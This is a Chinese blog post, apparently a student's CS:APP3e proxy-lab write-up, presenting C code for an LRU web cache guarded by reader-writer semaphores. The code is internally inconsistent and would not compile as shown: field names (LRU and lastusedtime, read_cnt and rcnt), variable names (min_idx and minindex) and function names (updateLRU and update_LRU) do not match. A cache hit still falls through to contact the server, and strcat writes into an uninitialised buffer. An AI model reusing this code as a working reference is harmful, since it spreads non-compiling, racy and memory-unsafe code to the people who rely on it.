<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE 10</span><br><span class="hljs-comment">// Cache structure</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> obj[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">char</span> uri[MAXLINE];<br>    <span class="hljs-type">int</span> LRU;<br>    <span class="hljs-type">int</span> isEmpty;<br>    <span class="hljs-type">int</span> read_cnt;<br>    <span class="hljs-type">sem_t</span> write_mutex;<br>    <span class="hljs-type">sem_t</span> rcnt_mutex;<br>&#125; block;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    block data[MAX_CACHE];<br>    <span class="hljs-type">int</span> num;<br>&#125; Cache;<br>Cache cache;<br></code></pre></td></tr></table></figure>

<p>对缓存初始化，在主函数中调用一次：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * initCache - initialize cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin initCache */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">initCache</span><span class="hljs-params">()</span><br>&#123;<br>    cache.num = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        cache.data[i].lastusedtime = <span class="hljs-number">0</span>;<br>        cache.data[i].isEmpty = <span class="hljs-number">1</span>;<br>        Sem_init(&amp;cache.data[i].write_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        Sem_init(&amp;cache.data[i].rcnt_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        cache.data[i].read_cnt = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end initCache */</span><br></code></pre></td></tr></table></figure>

<p>修改<code>doit</code>函数，使得URI在缓存中时从缓存中读取，不在缓存中时连接服务器，将换入的内容写入缓冲区，连接关闭后进行缓存替换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * doit - handle one HTTP request/response transaction</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin doit */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>    <span class="hljs-type">char</span> server[MAXLINE];<br>    <span class="hljs-type">char</span> cache_tag[MAXLINE];<br>    <span class="hljs-type">rio_t</span> rio, server_rio;<br>    <br>    <span class="hljs-comment">/* Read request line and headers */</span><br>    Rio_readinitb(&amp;rio, connfd);<br>    Rio_readlineb(&amp;rio, buf, MAXLINE);<br>    <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version);<br>    <span class="hljs-built_in">strcpy</span>(cache_tag,uri);<br>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy does not implement this method.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Parse URI from GET request */</span><br>    parsed_uri *uri_data = (parsed_uri *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(parsed_uri));<br>    <span class="hljs-comment">/* Attempt to get data from cache */</span><br>    <span class="hljs-type">int</span> cache_idx;<br>    <span class="hljs-keyword">if</span>((cache_idx=getCache(cache_tag))!=<span class="hljs-number">-1</span>)&#123;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt</span><br>        P(&amp;cache.data[cache_idx].rcnt_mutex);<br>        cache.data[cache_idx].rcnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// Lock write_mutex</span><br>        <span class="hljs-keyword">if</span>(cache.data[cache_idx].rcnt==<span class="hljs-number">1</span>)P(&amp;cache.data[cache_idx].write_mutex);<br>        <span class="hljs-comment">// Unlock read_cnt</span><br>        V(&amp;cache.data[cache_idx].rcnt_mutex);<br><br>        Rio_writen(connfd, cache.data[cache_idx].obj, <span class="hljs-built_in">strlen</span>(cache.data[cache_idx].obj));<br><br>        <span class="hljs-comment">// Lock&amp;update read_cnt</span><br>        P(&amp;cache.data[cache_idx].rcnt_mutex);<br>        cache.data[cache_idx].rcnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// Unlock write_mutex</span><br>        <span class="hljs-keyword">if</span>(cache.data[cache_idx].rcnt==<span class="hljs-number">0</span>)V(&amp;cache.data[cache_idx].write_mutex);<br>        <span class="hljs-comment">// Unlock read_cnt</span><br>        V(&amp;cache.data[cache_idx].rcnt_mutex);<br>    &#125;<br>    parse_uri(uri, uri_data);<br>    creat_header(server, uri_data, &amp;rio);<br>    <span class="hljs-comment">/* Connect to server */</span><br>    <span class="hljs-type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);<br>    <span class="hljs-keyword">if</span> (serverfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Rio_readinitb(&amp;server_rio, serverfd);<br>    Rio_writen(serverfd, server, <span class="hljs-built_in">strlen</span>(server));<br>    <span class="hljs-comment">/* Update cache */</span><br>    <span class="hljs-type">char</span> cache_buf[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">int</span> size_buf = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> n;<br>    <span class="hljs-keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)))&#123;<br>        size_buf += n;<br>        <span class="hljs-keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)<span class="hljs-built_in">strcat</span>(cache_buf, buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy transmitted %d bytes.\n&quot;</span>, (<span class="hljs-type">int</span>)n);<br>        Rio_writen(connfd, buf, n);<br>    &#125;<br>    Close(serverfd);<br>    <span class="hljs-keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)writeCache(cache_tag, cache_buf);<br>&#125;<br><span class="hljs-comment">/* $end doit */</span><br></code></pre></td></tr></table></figure>

<p>读写缓存操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * getCache - fetch data from cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin getCache */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getCache</span><span class="hljs-params">(<span class="hljs-type">char</span> *url)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt, lock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>) P(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>        <span class="hljs-comment">// Found data</span><br>        <span class="hljs-keyword">if</span> (!cache.data[i].isEmpty &amp;&amp; !<span class="hljs-built_in">strcmp</span>(url, cache.data[i].uri))<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt, unlock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (i &gt;= MAX_CACHE) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-comment">/* $end getCache */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * writeCache - fetch data from cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin writeCache */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">writeCache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = getIndex();<br>    P(&amp;cache.data[i].write_mutex);<br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].obj, buf);<br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].uri, uri);<br>    cache.data[i].isEmpty = <span class="hljs-number">0</span>;<br>    cache.data[i].lastusedtime = INT_MAX;<br>    updateLRU(i);<br>    V(&amp;cache.data[i].write_mutex);<br>&#125;<br><span class="hljs-comment">/* $end writeCache */</span><br></code></pre></td></tr></table></figure>

<p><code>getIndex</code>寻找可以插入的缓存行，返回目标插入位置（空行或用LRU策略替换的行）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * getIndex - find corresponding cache line</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin getIndex */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getIndex</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> min = INT_MAX;<br>    <span class="hljs-type">int</span> min_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">// update read_cnt, lock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>) P(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>        <span class="hljs-comment">// found target line</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].isEmpty)&#123;<br>            minindex = i;<br>            P(&amp;cache.data[i].rcnt_mutex);<br>            cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>            V(&amp;cache.data[i].rcnt_mutex);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// no target line, attempting to find LRU line</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].lastusedtime &lt; min)&#123;<br>            minindex = i;<br>            P(&amp;cache.data[i].rcnt_mutex);<br>            cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>            V(&amp;cache.data[i].rcnt_mutex);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// update read_cnt, unlock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>    &#125;<br>    <span class="hljs-keyword">return</span> minindex;<br>&#125;<br><span class="hljs-comment">/* $end getIndex */</span><br></code></pre></td></tr></table></figure>

<p><code>updateLRU</code>更新LRU计数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * updateLRU - update lastusedtime</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin updateLRU */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">update_LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!cache.data[i].isEmpty &amp;&amp; i!=index)&#123;<br>            P(&amp;cache.data[i].write_mutex);<br>            cache.data[i].lastusedtime-=<span class="hljs-number">1</span>;<br>            V(&amp;cache.data[i].write_mutex);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end updateLRU */</span><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Lab-Writeup/" class="category-chain-item">Lab-Writeup</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="print-no-link">#计算机基础</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CS:APP3e个人题解</div>
      <div>https://sgong-0224.github.io/CSAPP3e_WP/</div>
    </div>
    <div class="license-meta">
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月24日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
                    <i class="iconfont icon-nc"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
                    <i class="iconfont icon-nd"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
            </div>

            
  
  
    <article id="comments">
      
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'sgong-0224/GH_Pages_Comment');
      s.setAttribute('issue-term', 'pathname');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div>Powered by: <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量：
        <span id="busuanzi_value_site_pv"></span>
         
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数：
        <span id="busuanzi_value_site_uv"></span>
         
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>








  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
